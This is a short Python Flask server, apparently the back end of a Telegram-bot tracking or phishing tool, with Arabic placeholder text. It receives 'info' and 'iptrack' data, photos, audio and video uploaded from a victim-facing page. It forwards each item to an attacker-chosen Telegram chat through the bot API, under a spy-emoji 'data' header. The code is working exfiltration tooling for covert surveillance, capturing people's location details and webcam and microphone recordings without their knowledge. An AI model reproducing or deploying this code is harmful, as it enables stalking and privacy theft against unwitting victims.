import os
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder='templates')
TOKEN = os.environ.get("TOKEN", "ضع_التوكن_هنا")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    chat_id = request.form.get('chatId')
    action_type = request.form.get('type')
    if not chat_id: return jsonify({"error": "No chat ID"}), 400

    if action_type in ['info', 'iptrack']:
        data = request.form.get('data')
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": f"🕵️‍♂️ *البيانات:*\n\n{data}", "parse_mode": "Markdown"})
        return jsonify({"status": "success"})

    if 'file' not in request.files: return jsonify({"error": "No file part"}), 400
    file = request.files['file']
    
    if action_type == 'audio':
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio", files={'audio': ('audio.webm', file.read())}, data={'chat_id': chat_id})
    elif action_type == 'photo':
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", files={'photo': ('photo.jpg', file.read())}, data={'chat_id': chat_id})
    elif action_type == 'video':
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo", files={'video': ('video.webm', file.read())}, data={'chat_id': chat_id})
    return jsonify({"status": "uploaded"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
